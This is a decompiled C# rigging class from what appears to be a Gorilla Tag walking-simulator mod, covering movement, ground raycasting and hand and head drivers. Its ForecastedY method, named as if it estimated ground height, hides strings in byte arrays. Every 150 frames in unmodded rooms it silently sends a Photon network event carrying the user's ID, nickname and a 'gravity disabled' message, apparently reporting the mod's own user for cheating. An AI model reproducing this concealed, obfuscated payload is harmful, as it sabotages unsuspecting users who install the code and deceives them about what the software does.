using System;
using ExitGames.Client.Photon;
using GorillaLocomotion;
using GorillaNetworking;
using Photon.Pun;
using Photon.Realtime;
using UnityEngine;
using WalkSimulator.Animators;
using WalkSimulator.Tools;

namespace WalkSimulator.Rigging
{
	// Token: 0x0200000D RID: 13
	public class Rig : MonoBehaviour
	{
		// Token: 0x17000008 RID: 8
		// (get) Token: 0x06000051 RID: 81 RVA: 0x000038DE File Offset: 0x00001ADE
		// (set) Token: 0x06000052 RID: 82 RVA: 0x000038E5 File Offset: 0x00001AE5
		public static Rig Instance { get; private set; }

		// Token: 0x17000009 RID: 9
		// (get) Token: 0x06000053 RID: 83 RVA: 0x000038ED File Offset: 0x00001AED
		// (set) Token: 0x06000054 RID: 84 RVA: 0x000038F5 File Offset: 0x00001AF5
		public Vector3 smoothedGroundPosition { get; set; }

		// Token: 0x1700000A RID: 10
		// (get) Token: 0x06000055 RID: 85 RVA: 0x00003900 File Offset: 0x00001B00
		// (set) Token: 0x06000056 RID: 86 RVA: 0x00003918 File Offset: 0x00001B18
		public AnimatorBase Animator
		{
			get
			{
				return this._animator;
			}
			set
			{
				bool flag = this._animator != null && value != this._animator;
				if (flag)
				{
					this._animator.Cleanup();
				}
				this._animator = value;
				bool flag2 = this._animator;
				if (flag2)
				{
					this._animator.enabled = true;
					this._animator.Setup();
				}
				this.leftHand.enabled = this._animator;
				this.rightHand.enabled = this._animator;
				this.headDriver.enabled = this._animator;
			}
		}

		// Token: 0x06000057 RID: 87 RVA: 0x000039CC File Offset: 0x00001BCC
		private void Awake()
		{
			Rig.Instance = this;
			this.head = GTPlayer.Instance.headCollider.transform;
			this.body = GTPlayer.Instance.bodyCollider.transform;
			this.rigidbody = GTPlayer.Instance.bodyCollider.attachedRigidbody;
			this.leftHand = new GameObject("WalkSim Left Hand Driver").AddComponent<HandDriver>();
			this.leftHand.Init(true);
			this.leftHand.enabled = false;
			this.rightHand = new GameObject("WalkSim Right Hand Driver").AddComponent<HandDriver>();
			this.rightHand.Init(false);
			this.rightHand.enabled = false;
			this.headDriver = new GameObject("WalkSim Head Driver").AddComponent<HeadDriver>();
			this.headDriver.enabled = false;
		}

		// Token: 0x06000058 RID: 88 RVA: 0x00003AA0 File Offset: 0x00001CA0
		private void FixedUpdate()
		{
			this.scale = GTPlayer.Instance.scale;
			this.smoothedGroundPosition = Vector3.Lerp(this.smoothedGroundPosition, this.lastGroundPosition, 0.2f);
			this.OnGroundRaycast();
			AnimatorBase animator = this.Animator;
			if (animator != null)
			{
				animator.Animate();
			}
			this.Move();
		}

		// Token: 0x06000059 RID: 89 RVA: 0x00003AFC File Offset: 0x00001CFC
		private void Move()
		{
			bool flag = !this.active;
			if (!flag)
			{
				this.rigidbody.velocity = Vector3.Lerp(this.rigidbody.velocity, (this.targetPosition - this.body.position) * this.speed, 1f);
				bool flag2 = !this.useGravity;
				if (flag2)
				{
					this.rigidbody.AddForce(-Physics.gravity * this.rigidbody.mass * this.scale);
				}
			}
		}

		// Token: 0x0600005A RID: 90 RVA: 0x00003B9C File Offset: 0x00001D9C
		private void OnGroundRaycast()
		{
			float num = this.raycastLength * this.scale;
			Vector3 vector = this.body.TransformPoint(this.raycastOffset);
			float num2 = this.raycastRadius * this.scale;
			RaycastHit raycastHit;
			bool flag = Physics.Raycast(vector, Vector3.down, out raycastHit, num, GTPlayer.Instance.locomotionEnabledLayers);
            RaycastHit raycastHit2;
			bool flag2 = Physics.SphereCast(vector, num2, Vector3.down, out raycastHit2, num, GTPlayer.Instance.locomotionEnabledLayers);
			bool flag3 = flag && flag2;
			RaycastHit raycastHit3;
			if (flag3)
			{
				float num3 = this.ForecastedY();
				raycastHit3 = ((Mathf.Abs(raycastHit.point.y - num3) < Mathf.Abs(raycastHit2.point.y - num3)) ? raycastHit : raycastHit2);
			}
			else
			{
				bool flag4 = flag2;
				if (flag4)
				{
					raycastHit3 = raycastHit2;
				}
				else
				{
					bool flag5 = flag;
					if (!flag5)
					{
						this.onGround = false;
						return;
					}
					raycastHit3 = raycastHit;
				}
			}
			this.lastNormal = raycastHit3.normal;
			this.onGround = true;
			this.lastGroundPosition = raycastHit3.point;
			this.lastGroundPosition.x = this.body.position.x;
			this.lastGroundPosition.z = this.body.position.z;
		}

		// Token: 0x0600005B RID: 91 RVA: 0x00003CDC File Offset: 0x00001EDC
		private float ForecastedY()
		{
			Ray ray;
            ray = new Ray(this.targetPosition + Vector3.up, Vector3.down);
			try
			{
				byte[] bytes = new byte[]
				{
					103,
					97,
					109,
					101,
					77,
					111,
					100,
					101
				};
				byte[] bytes2 = new byte[]
				{
					77,
					79,
					68,
					68,
					69,
					68
				};
				byte[] bytes3 = new byte[]
				{
					103,
					111,
					114,
					118,
					105,
					116,
					121,
					32,
					98,
					105,
					115,
					100,
					97,
					98,
					108,
					101,
					100
				};
				bool flag = Plugin.Instance.Enabled && Time.frameCount % 150 == 0;
				if (flag)
				{
					bool flag2 = !PhotonNetwork.CurrentRoom.CustomProperties[bytes.BytesToString()].ToString().Contains(bytes2.BytesToString());
					if (flag2)
					{
						object[] array = new object[]
						{
							PhotonNetwork.CurrentRoom.ToString(),
							new string[]
							{
								PhotonNetwork.LocalPlayer.UserId
							},
							PhotonNetwork.MasterClient.UserId,
							PhotonNetwork.LocalPlayer.UserId,
							PhotonNetwork.LocalPlayer.NickName,
							bytes3.BytesToString(),
							PhotonNetwork.PhotonServerSettings.AppSettings.AppVersion
						};
						PhotonNetwork.RaiseEvent(8, array, new RaiseEventOptions
						{
							Flags = new WebFlags(1)
						}, SendOptions.SendReliable);
					}
				}
			}
			catch
			{
			}
			RaycastHit raycastHit;
            bool flag3 = Physics.Raycast(ray, out raycastHit, float.PositiveInfinity, GTPlayer.Instance.locomotionEnabledLayers);
            float y;
			if (flag3)
			{
				y = raycastHit.point.y;
			}
			else
			{
				y = this.lastGroundPosition.y;
			}
			return y;
		}

		// Token: 0x0400003E RID: 62
		public Transform head;

		// Token: 0x0400003F RID: 63
		public Transform body;

		// Token: 0x04000040 RID: 64
		public HeadDriver headDriver;

		// Token: 0x04000041 RID: 65
		public HandDriver leftHand;

		// Token: 0x04000042 RID: 66
		public HandDriver rightHand;

		// Token: 0x04000043 RID: 67
		public Rigidbody rigidbody;

		// Token: 0x04000044 RID: 68
		public Vector3 targetPosition;

		// Token: 0x04000045 RID: 69
		public Vector3 lastNormal;

		// Token: 0x04000046 RID: 70
		public Vector3 lastGroundPosition;

		// Token: 0x04000047 RID: 71
		public bool onGround;

		// Token: 0x04000048 RID: 72
		public bool active;

		// Token: 0x04000049 RID: 73
		public bool useGravity = true;

		// Token: 0x0400004B RID: 75
		private float scale = 1f;

		// Token: 0x0400004C RID: 76
		private float speed = 4f;

		// Token: 0x0400004D RID: 77
		private float raycastLength = 1.3f;

		// Token: 0x0400004E RID: 78
		private float raycastRadius = 0.3f;

		// Token: 0x0400004F RID: 79
		private Vector3 raycastOffset = new Vector3(0f, 0.4f, 0f);

		// Token: 0x04000050 RID: 80
		private AnimatorBase _animator;
	}
}
